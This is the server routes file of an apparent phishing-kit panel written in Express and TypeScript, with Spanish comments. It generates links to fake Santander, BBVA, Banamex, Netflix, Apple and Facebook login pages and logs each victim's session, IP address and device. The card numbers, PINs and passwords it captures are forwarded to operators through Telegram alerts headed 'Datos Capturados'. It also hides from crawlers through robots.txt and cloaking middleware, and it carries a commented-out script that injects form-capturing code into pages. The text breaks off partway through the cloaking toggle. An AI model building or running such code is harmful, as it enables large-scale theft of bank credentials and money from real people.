import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import * as fs from "fs";
import * as path from "path";
import { 
  insertGeneratedLinkSchema, 
  insertSessionSchema, 
  insertSubmissionSchema, 
  insertAvailableDomainSchema,
  insertUserRegisterSchema,
  insertUserLoginSchema,
  updateMembershipSchema 
} from "@shared/schema";
import { randomUUID } from "crypto";
import { templateCloakingMiddleware } from "./middleware/cloaking";
import { validateSessionMiddleware } from "./middleware/sessionValidation";
import { logger, logDebug } from "./logger";

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);
  
  // Initialize admin user
  await initializeAdmin();

  // Serve robots.txt to block crawlers
  app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    const robotsPath = path.join(process.cwd(), 'public', 'robots.txt');
    if (fs.existsSync(robotsPath)) {
      res.sendFile(robotsPath);
    } else {
      // Fallback robots.txt
      res.send(`User-agent: *\nDisallow: /\n\n# Sistema protegido - Acceso no autorizado`);
    }
  });

  // WebSocket server setup con límites
  const wss = new WebSocketServer({ 
    server: httpServer, 
    path: '/ws'
    // Nota: maxConnections se controla manualmente
  });
  const connectedClients = new Set<WebSocket>();
  const connectionCounts = new Map<string, number>();

  wss.on('connection', (ws, req) => {
    // Verificar límites por IP
    const clientIP = req.socket.remoteAddress || 'unknown';
    const currentCount = connectionCounts.get(clientIP) || 0;
    
    if (currentCount >= 5) { // Máximo 5 conexiones por IP
      logger.warn(`WebSocket: Conexión rechazada para IP ${clientIP} (límite excedido)`);
      ws.close(1008, 'Too many connections');
      return;
    }

    connectedClients.add(ws);
    connectionCounts.set(clientIP, currentCount + 1);
    logger.periodic('ws_connect', 2, `WebSocket conectado: ${connectedClients.size} clientes activos`);

    ws.on('close', () => {
      connectedClients.delete(ws);
      const newCount = Math.max(0, (connectionCounts.get(clientIP) || 1) - 1);
      if (newCount === 0) {
        connectionCounts.delete(clientIP);
      } else {
        connectionCounts.set(clientIP, newCount);
      }
      logDebug('WebSocket cliente desconectado');
    });

    ws.on('error', (error) => {
      logger.error('WebSocket error:', error);
      connectedClients.delete(ws);
    });
  });

  // Broadcast optimizado con manejo de errores
  function broadcast(data: any) {
    if (connectedClients.size === 0) return;
    
    const message = JSON.stringify(data);
    const deadClients = new Set<WebSocket>();
    
    connectedClients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        try {
          client.send(message);
        } catch (error) {
          logger.error('Error sending WebSocket message:', error);
          deadClients.add(client);
        }
      } else {
        deadClients.add(client);
      }
    });
    
    // Limpiar conexiones muertas
    deadClients.forEach(client => {
      connectedClients.delete(client);
    });
    
    if (deadClients.size > 0) {
      logDebug(`Limpiadas ${deadClients.size} conexiones WebSocket muertas`);
    }
  }

  // Send Telegram notifications for important events
  async function sendTelegramNotifications(eventType: string, eventData: any) {
    logDebug(`Telegram: Enviando notificación para evento: ${eventType}`);
    
    try {
      const users = await storage.getUsersWithTelegramNotifications();
      logger.periodic('telegram_users', 2, `Telegram: ${users.length} usuarios con notificaciones activas`);
      
      if (users.length === 0) {
        logDebug("Telegram: No hay usuarios con notificaciones habilitadas");
        return;
      }

      const { TelegramService } = await import("./telegram-service");
      
      for (const user of users) {
        logDebug(`Telegram: Procesando usuario ${user.username}`);
        
        if (user.telegramChatId) {
          let message = "";
          
          switch (eventType) {
            case 'new_session':
              message = `🚨 <b>Nueva Sesión Iniciada</b>\n\n` +
                       `📱 Template: ${eventData.templateName || 'Desconocido'}\n` +
                       `🌐 IP: ${eventData.ipAddress}\n` +
                       `⏰ Hora: ${new Date().toLocaleString('es-ES')}`;
              break;
              
            case 'form_submitted':
              const formDataText = eventData.formData ? 
                Object.entries(eventData.formData)
                  .map(([key, value]) => `• <b>${key}</b>: ${value}`)
                  .join('\n') 
                : `• <b>${eventData.fieldName}</b>: ${eventData.fieldValue}`;

              message = `✅ <b>Datos Capturados</b>\n\n` +
                       `📱 <b>Template</b>: ${eventData.templateName}\n` +
                       `📋 <b>Pantalla</b>: ${eventData.screenName}\n` +
                       `🌐 <b>IP</b>: ${eventData.ipAddress || 'No disponible'}\n` +
                       `📧 <b>Dispositivo</b>: ${eventData.userAgent?.substring(0, 50) || 'No disponible'}...\n\n` +
                       `💰 <b>Datos obtenidos</b>:\n${formDataText}\n\n` +
                       `⏰ <b>Hora</b>: ${eventData.timestamp ? eventData.timestamp.toLocaleString('es-ES', { timeZone: 'America/Mexico_City' }) : new Date().toLocaleString('es-ES')}`;
              break;
              
            case 'session_completed':
              message = `🎯 <b>Sesión Completada</b>\n\n` +
                       `📱 Template: ${eventData.templateName || 'Desconocido'}\n` +
                       `⏱️ Duración: ${eventData.duration || 'No disponible'}\n` +
                       `✅ Estado: Finalizada correctamente\n` +
                       `⏰ Hora: ${new Date().toLocaleString('es-ES')}`;
              break;
              
            case 'multiple_sessions':
              message = `📊 <b>Actividad Alta Detectada</b>\n\n` +
                       `🔥 ${eventData.count} nuevas sesiones en los últimos 10 minutos\n` +
                       `📱 Templates más activos: ${eventData.topTemplates?.join(', ') || 'Varios'}\n` +
                       `⏰ Hora: ${new Date().toLocaleString('es-ES')}`;
              break;
              
            default:
              message = `⚡ <b>Evento del Sistema</b>\n\n` +
                       `Tipo: ${eventType}\n` +
                       `⏰ Hora: ${new Date().toLocaleString('es-ES')}`;
          }

          logDebug(`Telegram: Enviando mensaje a ${user.telegramChatId}`);
          const result = await TelegramService.sendMessage(user.telegramChatId, message);
          if (result) {
            logger.info(`Telegram enviado a ${user.username}`);
          } else {
            logger.warn(`Telegram falló para ${user.username}`);
          }
        } else {
          logger.warn(`Usuario ${user.username} sin Chat ID configurado`);
        }
      }
    } catch (error) {
      logger.error("Telegram: Error enviando notificaciones", error);
    }
  }

  // Dashboard stats (public)
  app.get("/api/dashboard/stats", async (req, res) => {
    try {
      const stats = await storage.getDashboardStats();
      res.json(stats);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch dashboard stats" });
    }
  });

  // Eliminado: /api/admin/user-id ya no se necesita - cada usuario usa su ID único

  // Templates
  app.get("/api/templates", async (req, res) => {
    try {
      const templates = await storage.getAllTemplates();
      res.json(templates);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch templates" });
    }
  });

  app.get("/api/templates/:name", async (req, res) => {
    try {
      const template = await storage.getTemplateByName(req.params.name);
      if (!template) {
        return res.status(404).json({ error: "Template not found" });
      }
      res.json(template);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch template" });
    }
  });

  // Available Domains
  app.get("/api/domains", async (req, res) => {
    try {
      const domains = await storage.getAllAvailableDomains();
      res.json(domains);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch domains" });
    }
  });

  app.post("/api/domains", async (req, res) => {
    try {
      const validatedData = insertAvailableDomainSchema.parse(req.body);
      const domain = await storage.createAvailableDomain(validatedData);
      
      // Broadcast domain creation to all connected clients
      broadcast({
        type: 'domain_created',
        data: domain
      });
      
      res.json(domain);
    } catch (error) {
      res.status(400).json({ error: "Invalid domain data" });
    }
  });

  app.patch("/api/domains/:id", async (req, res) => {
    try {
      const validatedData = insertAvailableDomainSchema.partial().parse(req.body);
      const domain = await storage.updateAvailableDomain(req.params.id, validatedData);
      if (!domain) {
        return res.status(404).json({ error: "Domain not found" });
      }
      
      // Broadcast domain update to all connected clients
      broadcast({
        type: 'domain_updated',
        data: domain
      });
      
      res.json(domain);
    } catch (error) {
      res.status(400).json({ error: "Invalid domain data" });
    }
  });

  app.delete("/api/domains/:id", async (req, res) => {
    try {
      const success = await storage.deleteAvailableDomain(req.params.id);
      if (!success) {
        return res.status(404).json({ error: "Domain not found" });
      }
      
      // Broadcast domain deletion to all connected clients
      broadcast({
        type: 'domain_deleted',
        data: { id: req.params.id }
      });
      
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete domain" });
    }
  });

  // Generated Links
  app.post("/api/links", async (req, res) => {
    try {
      logDebug(`Creando link para template: ${req.body.templateId}`);
      const validatedData = insertGeneratedLinkSchema.parse(req.body);
      
      // Check if template exists
      const template = await storage.getTemplate(validatedData.templateId!);
      if (!template) {
        return res.status(400).json({ error: "Template not found" });
      }

      // Check if a link already exists for this user and template
      const existingLink = await storage.getGeneratedLinkByUserAndTemplate(
        validatedData.userId!, 
        validatedData.templateId!
      );
      
      if (existingLink) {
        // Return existing link instead of creating duplicate
        res.json(existingLink);
        return;
      }

      // Generate URL using numeric ID instead of template name
      const url = `${validatedData.domain}/${validatedData.userId}/${template.numericId}`;
      
      const linkData = {
        ...validatedData,
        url,
        isActive: true
      };
      
      const link = await storage.createGeneratedLink(linkData);

      broadcast({
        type: 'link_created',
        data: link
      });

      res.json(link);
    } catch (error) {
      console.error("Link creation error:", error);
      res.status(400).json({ error: "Invalid link data", details: (error as Error).message });
    }
  });

  app.get("/api/links", async (req, res) => {
    try {
      const links = await storage.getAllGeneratedLinks();
      res.json(links);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch links" });
    }
  });

  app.delete("/api/links/:id", async (req, res) => {
    try {
      const success = await storage.deleteGeneratedLink(req.params.id);
      if (!success) {
        return res.status(404).json({ error: "Link not found" });
      }
      
      broadcast({
        type: 'link_deleted',
        data: { id: req.params.id }
      });

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete link" });
    }
  });

  // Sessions
  app.post("/api/sessions", async (req, res) => {
    try {
      const validatedData = insertSessionSchema.parse(req.body);
      const session = await storage.createSession(validatedData);
      
      broadcast({
        type: 'session_created',
        data: session
      });

      res.json(session);
    } catch (error) {
      res.status(400).json({ error: "Invalid session data" });
    }
  });

  app.get("/api/sessions", async (req, res) => {
    try {
      const sessions = await storage.getAllSessions();
      res.json(sessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch sessions" });
    }
  });

  // User-specific sessions
  app.get("/api/users/:userId/sessions", async (req, res) => {
    try {
      const { userId } = req.params;
      const userLinks = await storage.getAllGeneratedLinks();
      const userLinkIds = userLinks.filter(link => link.userId === userId).map(link => link.id);
      
      const allSessions = await storage.getAllSessions();
      const userSessions = allSessions.filter(session => 
        session.linkId && userLinkIds.includes(session.linkId)
      );
      
      res.json(userSessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch user sessions" });
    }
  });

  app.get("/api/sessions/active", async (req, res) => {
    try {
      const sessions = await storage.getActiveSessions();
      res.json(sessions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch active sessions" });
    }
  });

  // User-specific active sessions
  app.get("/api/users/:userId/sessions/active", async (req, res) => {
    try {
      const { userId } = req.params;
      const userLinks = await storage.getAllGeneratedLinks();
      const userLinkIds = userLinks.filter(link => link.userId === userId).map(link => link.id);
      
      const allActiveSessions = await storage.getActiveSessions();
      const userActiveSessions = allActiveSessions.filter(session => 
        session.linkId && userLinkIds.includes(session.linkId)
      );

      // Include submissions for each session
      const sessionsWithData = await Promise.all(
        userActiveSessions.map(async (session) => {
          const submissions = await storage.getSubmissionsBySessionId(session.id);
          const link = session.linkId ? await storage.getGeneratedLink(session.linkId) : null;
          const template = link ? await storage.getTemplate(link.templateId!) : null;
          
          return {
            ...session,
            submissions,
            link: link && template ? { ...link, template } : null
          };
        })
      );
      
      res.json(sessionsWithData);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch user active sessions" });
    }
  });

  app.get("/api/sessions/:id", async (req, res) => {
    try {
      const session = await storage.getSession(req.params.id);
      if (!session) {
        return res.status(404).json({ error: "Session not found" });
      }
      
      const submissions = await storage.getSubmissionsBySessionId(session.id);
      const link = await storage.getGeneratedLink(session.linkId!);
      const template = link ? await storage.getTemplate(link.templateId!) : undefined;
      
      res.json({
        ...session,
        submissions,
        link: link && template ? { ...link, template } : null
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch session" });
    }
  });

  app.patch("/api/sessions/:id", async (req, res) => {
    try {
      const sessionId = req.params.id;
      const validatedData = insertSessionSchema.partial().parse(req.body);
      
      const updatedSession = await storage.updateSession(sessionId, validatedData);
      if (!updatedSession) {
        return res.status(404).json({ error: "Session not found" });
      }
      
      // Broadcast session update
      broadcast({
        type: 'session_updated',
        data: updatedSession
      });
      
      res.json(updatedSession);
    } catch (error) {
      console.error("Error updating session:", error);
      res.status(400).json({ error: "Invalid session data" });
    }
  });

  // Change session screen
  app.post("/api/sessions/:id/change-screen", async (req, res) => {
    try {
      const sessionId = req.params.id;
      const { currentScreen } = req.body;
      
      if (!currentScreen) {
        return res.status(400).json({ error: "currentScreen is required" });
      }
      
      const updatedSession = await storage.updateSession(sessionId, { currentScreen });
      if (!updatedSession) {
        return res.status(404).json({ error: "Session not found" });
      }
      
      // Broadcast session update
      broadcast({
        type: 'session_updated',
        data: updatedSession
      });
      
      res.json(updatedSession);
    } catch (error) {
      console.error("Error changing session screen:", error);
      res.status(500).json({ error: "Failed to change screen" });
    }
  });

  // Clear sessions
  app.delete("/api/sessions/clear", async (req, res) => {
    try {
      const { userId } = req.body;
      
      let success = false;
      
      if (userId) {
        // Clear sessions for specific user
        success = await storage.clearSessionsByUserId(userId);
      } else {
        // Clear all sessions (admin only)
        success = await storage.clearAllSessions();
      }
      
      if (success) {
        // Broadcast sessions cleared
        broadcast({
          type: 'sessions_cleared',
          data: { userId: userId || null }
        });
        
        res.json({ success: true, message: "Sessions cleared successfully" });
      } else {
        res.status(500).json({ error: "Failed to clear sessions" });
      }
    } catch (error) {
      console.error("Error clearing sessions:", error);
      res.status(500).json({ error: "Failed to clear sessions" });
    }
  });

  // Submissions
  app.post("/api/submissions", async (req, res) => {
    try {
      const validatedData = insertSubmissionSchema.parse(req.body);
      const submission = await storage.createSubmission(validatedData);
      
      broadcast({
        type: 'submission_created',
        data: submission
      });

      // Get session and template information for richer notifications
      let sessionInfo = null;
      let templateInfo = null;
      
      if (submission.sessionId) {
        sessionInfo = await storage.getSession(submission.sessionId);
        if (sessionInfo?.linkId) {
          const link = await storage.getGeneratedLink(sessionInfo.linkId);
          if (link?.templateId) {
            templateInfo = await storage.getTemplate(link.templateId);
          }
        }
      }

      // Get all submissions for this session to send complete data
      const allSubmissions = submission.sessionId 
        ? await storage.getSubmissionsBySessionId(submission.sessionId)
        : [submission];

      // Organize submissions by field name
      const formData: Record<string, string> = {};
      allSubmissions.forEach(sub => {
        if (sub.fieldName && sub.fieldValue) {
          formData[sub.fieldName] = sub.fieldValue;
        }
      });

      // Send Telegram notification with real data
      await sendTelegramNotifications('form_submitted', {
        templateName: templateInfo?.displayName || templateInfo?.name || 'Plantilla desconocida',
        screenName: submission.fieldName === 'nip' ? 'NIP' : 
                   submission.fieldName === 'card' ? 'Tarjeta' :
                   submission.fieldName?.includes('usuario') || submission.fieldName?.includes('user') ? 'Usuario/Email' :
                   'Datos capturados',
        ipAddress: sessionInfo?.ipAddress,
        userAgent: sessionInfo?.userAgent,
        formData: formData,
        fieldName: submission.fieldName,
        fieldValue: submission.fieldValue,
        sessionId: submission.sessionId,
        timestamp: new Date()
      });

      res.json(submission);
    } catch (error) {
      console.error("Error creating submission:", error);
      res.status(400).json({ error: "Invalid submission data" });
    }
  });

  // Submit endpoint for template forms (Facebook, etc.)
  app.post("/api/submit", async (req, res) => {
    try {
      const { sessionId, type, screenName, data } = req.body;
      
      if (!sessionId || !data) {
        return res.status(400).json({ error: "sessionId and data are required" });
      }

      // Process each field in the data object as separate submissions
      const submissions = [];
      for (const [fieldName, fieldValue] of Object.entries(data)) {
        if (fieldValue && typeof fieldValue === 'string') {
          const submission = await storage.createSubmission({
            sessionId,
            fieldName,
            fieldValue: fieldValue as string
          });
          submissions.push(submission);
        }
      }

      // Broadcast each submission
      submissions.forEach(submission => {
        broadcast({
          type: 'submission_created',
          data: submission
        });
      });

      // Create activity record
      if (submissions.length > 0) {
        const session = await storage.getSession(sessionId);
        if (session?.linkId) {
          await storage.createActivity({
            type: 'data_submitted',
            description: `Datos capturados: ${Object.keys(data).join(', ')}`,
            sessionId: sessionId,
            linkId: session.linkId
          });
        }
      }

      // Get session and template information for notifications
      let sessionInfo = null;
      let templateInfo = null;
      
      if (sessionId) {
        sessionInfo = await storage.getSession(sessionId);
        if (sessionInfo?.linkId) {
          const link = await storage.getGeneratedLink(sessionInfo.linkId);
          if (link?.templateId) {
            templateInfo = await storage.getTemplate(link.templateId);
          }
        }
      }

      // Send Telegram notification
      await sendTelegramNotifications('form_submitted', {
        templateName: templateInfo?.displayName || templateInfo?.name || 'Facebook',
        screenName: screenName || 'Login',
        ipAddress: sessionInfo?.ipAddress,
        userAgent: sessionInfo?.userAgent,
        formData: data,
        fieldName: Object.keys(data)[0],
        fieldValue: Object.values(data)[0],
        sessionId: sessionId,
        timestamp: new Date()
      });

      res.json({ success: true, submissions });
    } catch (error) {
      console.error("Error processing form submission:", error);
      res.status(500).json({ error: "Failed to process submission" });
    }
  });

  // Activities
  app.get("/api/activities", async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 10;
      const activities = await storage.getRecentActivities(limit);
      res.json(activities);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch activities" });
    }
  });

  // User-specific activities
  app.get("/api/users/:userId/activities", async (req, res) => {
    try {
      const { userId } = req.params;
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 10;
      
      // Get user's links to filter activities
      const userLinks = await storage.getGeneratedLinksByUserId(userId);
      const userLinkIds = userLinks.map(link => link.id);
      
      const allActivities = await storage.getRecentActivities(1000); // Get more to filter
      const userActivities = allActivities.filter(activity => 
        activity.linkId && userLinkIds.includes(activity.linkId)
      );
      
      res.json(userActivities.slice(0, limit));
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch user activities" });
    }
  });

  // User-specific links
  app.get("/api/users/:userId/links", async (req, res) => {
    try {
      const { userId } = req.params;
      const links = await storage.getGeneratedLinksByUserId(userId);
      res.json(links);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch user links" });
    }
  });

  // User-specific dashboard stats
  app.get("/api/users/:userId/dashboard/stats", async (req, res) => {
    try {
      const { userId } = req.params;
      const userLinks = await storage.getAllGeneratedLinks();
      const userLinkIds = userLinks.filter(link => link.userId === userId).map(link => link.id);
      
      const allSessions = await storage.getAllSessions();
      const activeSessions = await storage.getActiveSessions();
      
      const userSessions = allSessions.filter(session => 
        session.linkId && userLinkIds.includes(session.linkId)
      );
      const userActiveSessions = activeSessions.filter(session => 
        session.linkId && userLinkIds.includes(session.linkId)
      );
      
      let totalSubmissions = 0;
      for (const session of userSessions) {
        const submissions = await storage.getSubmissionsBySessionId(session.id);
        totalSubmissions += submissions.length;
      }
      
      res.json({
        activeSessions: userActiveSessions.length,
        totalLinks: userLinks.filter(link => link.userId === userId).length,
        totalSessions: userSessions.length,
        totalSubmissions: totalSubmissions
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch user dashboard stats" });
    }
  });

  // Template rendering endpoint - Only match specific patterns, not Vite assets or API calls
  app.get("/:userId/:templateId", async (req, res, next) => {
    const { userId, templateId } = req.params;
    
    // Skip if this looks like a Vite asset, module request, API call, or template route
    if (userId.startsWith('@') || userId.includes('.') || templateId.includes('.') || 
        userId.startsWith('src') || userId.startsWith('node_modules') || userId === 'api' ||
        userId === 'template') {
      return next();
    }
    
    try {
      console.log(`Access attempt: /${userId}/${templateId}`);
      
      // Find the generated link by userId and templateId
      // templateId here is the numeric ID (1, 2, 3)
      const template = await storage.getTemplateByNumericId(templateId);
      if (!template) {
        console.log(`Template with numeric ID ${templateId} not found`);
        return res.status(404).send("Link not found");
      }
      
      const link = await storage.getGeneratedLinkByUserAndTemplate(userId, template.id);
      if (!link) {
        console.log(`Link for user ${userId} and template ${template.id} not found`);
        return res.status(404).send("Link not found");
      }
      
      console.log(`Found link: ${link.id}`);

      // Template already fetched above

      // Create a new session
      const session = await storage.createSession({
        linkId: link.id,
        status: "active",
        ipAddress: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent')
      });

      broadcast({
        type: 'session_created',
        data: session
      });

      // Serve the template page using template name (this will be handled by Vite in development)
      res.redirect(`/template/${template.name}?sessionId=${session.id}`);
    } catch (error) {
      res.status(500).send("Internal server error");
    }
  });

  // Legacy PHP template serving - DISABLED in favor of React components and cloaking
  // This route was conflicting with the cloaking middleware
  // All templates now use React components and proper cloaking protection
  /*
  app.get("/template/:templateName", async (req, res) => {
    try {
      const { templateName } = req.params;
      const sessionId = req.query.sessionId;
      
      // Security check - only allow known template names
      const validTemplates = ['santander', 'bbva', 'banamex', 'netflix', 'apple', 'facebook'];
      if (!validTemplates.includes(templateName)) {
        return res.status(404).send("Template not found");
      }
      
      // Read the template file
      const templatePath = path.join(process.cwd(), templateName, 'index.php');
      
      if (!fs.existsSync(templatePath)) {
        console.log(`Template file not found: ${templatePath}`);
        return res.status(404).send("Template file not found");
      }
      
      let content = fs.readFileSync(templatePath, 'utf8');
      
      // Replace the action URL to point to our submission endpoint
      content = content.replace(
        /action\s*=\s*['"](.*?)['"]/, 
        `action="/api/submit" data-session-id="${sessionId}"`
      );
      
      // Add session tracking script
      const trackingScript = `
        <script>
          const sessionId = "${sessionId}";
          
          // Track form submission
          document.addEventListener('DOMContentLoaded', function() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
              form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const formData = new FormData(form);
                const data = {
                  sessionId: sessionId,
                  type: 'form_submission',
                  data: Object.fromEntries(formData.entries())
                };
                
                fetch('/api/submit', {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                  },
                  body: JSON.stringify(data)
                }).then(() => {
                  // Redirect to a thank you page or close
                  alert('Datos enviados correctamente');
                });
              });
            });
          });
        </script>
      `;
      
      // Add tracking script before closing body tag
      content = content.replace('</body>', trackingScript + '</body>');
      
      res.setHeader('Content-Type', 'text/html');
      res.send(content);
      
    } catch (error) {
      console.error("Error serving template:", error);
      res.status(500).send("Error loading template");
    }
  });
  */

  // Authentication Routes
  app.post("/api/auth/register", async (req, res) => {
    try {
      const validatedData = insertUserRegisterSchema.parse(req.body);
      // Usar el permanentUserId del cliente como ID del usuario
      const userToCreate = {
        ...validatedData,
        id: req.body.permanentUserId as string
      };
      const user = await storage.registerUser(userToCreate);
      
      // Don't return password in response
      const { password, ...userResponse } = user;
      res.status(201).json(userResponse);
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "Registration failed";
      res.status(400).json({ error: errorMessage });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    try {
      console.log("Login request body:", req.body);
      const validatedData = insertUserLoginSchema.parse(req.body);
      console.log("Validated data:", validatedData);
      
      // Intentar login con el permanent ID primero
      let user = await storage.loginUser(validatedData);
      console.log("User found:", user ? "yes" : "no");
      
      if (!user) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      
      // Actualizar el ID del usuario al permanent ID si es diferente (excepto para admin)
      if (req.body.permanentUserId && user.id !== req.body.permanentUserId && user.role !== 'admin') {
        try {
          user = await storage.updateUserId(user.id, req.body.permanentUserId) || user;
        } catch (error) {
          console.log("Error updating user ID:", error);
          // Si hay error de clave duplicada, continuar sin cambiar el ID
        }
      }
      
      // Don't return password in response
      if (!user) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      const { password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      console.log("Login error:", error);
      res.status(400).json({ error: "Login failed" });
    }
  });

  // Admin login especial - sin permanent user ID conflicts
  app.post("/api/auth/admin-login", async (req, res) => {
    try {
      console.log("Admin login request body:", req.body);
      
      // Validar solo username y password
      const { username, password } = req.body;
      if (!username || !password) {
        return res.status(400).json({ error: "Username and password required" });
      }
      
      // Buscar usuario admin
      const user = await storage.getUserByUsername(username);
      console.log("Admin user found:", user ? "yes" : "no");
      
      if (!user || user.role !== 'admin' || !user.isActive) {
        return res.status(401).json({ error: "Invalid admin credentials" });
      }
      
      // Verificar contraseña con bcrypt (SEGURIDAD CRÍTICA)
      const bcrypt = await import("bcrypt");
      const passwordValid = await bcrypt.compare(password, user.password);
      if (!passwordValid) {
        return res.status(401).json({ error: "Invalid admin credentials" });
      }
      
      // Login exitoso - no cambiar ID para admin
      const { password: _, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      console.log("Admin login error:", error);
      res.status(400).json({ error: "Admin login failed" });
    }
  });

  app.get("/api/auth/me/:id", async (req, res) => {
    try {
      const user = await storage.getUserWithMembership(req.params.id);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }
      
      // Don't return password in response
      const { password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch user" });
    }
  });

  // Admin Routes - User Management
  app.get("/api/admin/users", async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      // Don't return passwords
      const usersResponse = users.map(({ password, ...user }) => user);
      res.json(usersResponse);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch users" });
    }
  });

  app.patch("/api/admin/users/:id/membership", async (req, res) => {
    try {
      const userId = req.params.id;
      const validatedData = updateMembershipSchema.parse({ userId, ...req.body });
      
      const user = await storage.updateUserMembership(validatedData);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }
      
      // Don't return password in response
      const { password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ error: "Failed to update membership" });
    }
  });

  // Admin Dashboard Stats
  app.get("/api/admin/dashboard/stats", async (req, res) => {
    try {
      const stats = await storage.getAdminDashboardStats();
      res.json(stats);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch admin stats" });
    }
  });

  // Telegram Configuration Endpoints
  app.post("/api/users/:userId/telegram", async (req, res) => {
    try {
      console.log(`[TELEGRAM CONFIG] Nueva configuración para usuario: ${req.params.userId}`);
      console.log(`[TELEGRAM CONFIG] Body:`, req.body);
      
      const { userId } = req.params;
      const { telegramChatId, telegramNotifications } = req.body;

      // Verificar que el usuario existe
      const existingUser = await storage.getUser(userId);
      if (!existingUser) {
        console.log(`[TELEGRAM CONFIG] ERROR: Usuario no encontrado: ${userId}`);
        return res.status(404).json({ error: "User not found" });
      }

      console.log(`[TELEGRAM CONFIG] Usuario encontrado: ${existingUser.username}`);

      // Si se proporciona un Chat ID, validarlo y verificarlo con Telegram
      if (telegramChatId) {
        console.log(`[TELEGRAM CONFIG] Validando Chat ID: "${telegramChatId}"`);
        
        // Validar que sea numérico (Chat IDs de Telegram son números)
        if (!/^-?\d+$/.test(telegramChatId.toString().trim())) {
          console.log(`[TELEGRAM CONFIG] ERROR: Chat ID no es numérico: "${telegramChatId}"`);
          return res.status(400).json({ 
            code: 'INVALID_CHAT_ID_FORMAT',
            error: "El Chat ID debe ser un número (ejemplo: 123456789). No uses @ ni texto."
          });
        }

        console.log(`[TELEGRAM CONFIG] Chat ID válido, verificando con Telegram...`);
        const { TelegramService } = await import("./telegram-service");
        const verificationResult = await TelegramService.verifyChatId(telegramChatId.toString().trim());
        
        console.log(`[TELEGRAM CONFIG] Resultado de verificación:`, verificationResult);
        
        if (!verificationResult.isValid) {
          console.log(`[TELEGRAM CONFIG] ERROR: Verificación falló: ${verificationResult.error}`);
          return res.status(400).json({ 
            code: 'CHAT_NOT_FOUND',
            error: verificationResult.error || "Debes iniciar el bot primero. Ve a @panelnemesisbot en Telegram y envía 'hola', luego pega aquí el Chat ID numérico que te dé."
          });
        }

        // Enviar mensaje de prueba si es la primera vez
        if (!existingUser.telegramChatId) {
          console.log(`[TELEGRAM CONFIG] Enviando mensaje de prueba...`);
          await TelegramService.sendTestMessage(telegramChatId.toString().trim(), existingUser.username);
        }
      }

      const updatedUser = await storage.updateUserTelegramConfig(
        userId,
        telegramChatId ? telegramChatId.toString().trim() : null,
        telegramNotifications || false
      );

      if (!updatedUser) {
        return res.status(500).json({ error: "Failed to update Telegram configuration" });
      }

      // No devolver la contraseña en la respuesta
      const { password, ...userResponse } = updatedUser;
      res.json(userResponse);
    } catch (error) {
      console.error("Error updating Telegram config:", error);
      res.status(500).json({ error: "Failed to update Telegram configuration" });
    }
  });

  // Test Telegram Connection
  app.post("/api/users/:userId/telegram/test", async (req, res) => {
    try {
      const { userId } = req.params;
      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      if (!user.telegramChatId) {
        return res.status(400).json({ error: "Telegram not configured for this user" });
      }

      const { TelegramService } = await import("./telegram-service");
      const success = await TelegramService.sendTestMessage(user.telegramChatId, user.username);

      if (success) {
        res.json({ success: true, message: "Test message sent successfully" });
      } else {
        res.status(400).json({ error: "Failed to send test message" });
      }
    } catch (error) {
      console.error("Error testing Telegram:", error);
      res.status(500).json({ error: "Failed to test Telegram connection" });
    }
  });

  // Test Telegram Notification System
  app.post("/api/telegram/test-notification", async (req, res) => {
    try {
      console.log("[TEST] Manual test of Telegram notifications triggered");
      
      await sendTelegramNotifications('form_submitted', {
        templateName: 'Test Template',
        screenName: 'Test Form',
        ipAddress: '127.0.0.1',
        userAgent: 'Test Browser',
        formData: {
          usuario: 'test@email.com',
          password: '123456',
          nip: '1234'
        },
        fieldName: 'test_field',
        fieldValue: 'test_value',
        sessionId: 'test-session-' + Date.now(),
        timestamp: new Date()
      });
      
      res.json({ success: true, message: "Test notification sent" });
    } catch (error) {
      console.error("[TEST] Error testing notification:", error);
      res.status(500).json({ error: "Failed to send test notification" });
    }
  });

  // Sistema de control de cloaking
  let cloakingEnabled = true; // Estado del cloaking

  app.get("/api/cloaking/status", (req, res) => {
    res.json({ enabled: cloakingEnabled });
  });

  app.patch("/api/cloaking/toggle", (req, res) => {
    const { enabled } = req.body;
    if (typeof enabled === 'boolean') {
      cloakingEnabled = enabled;
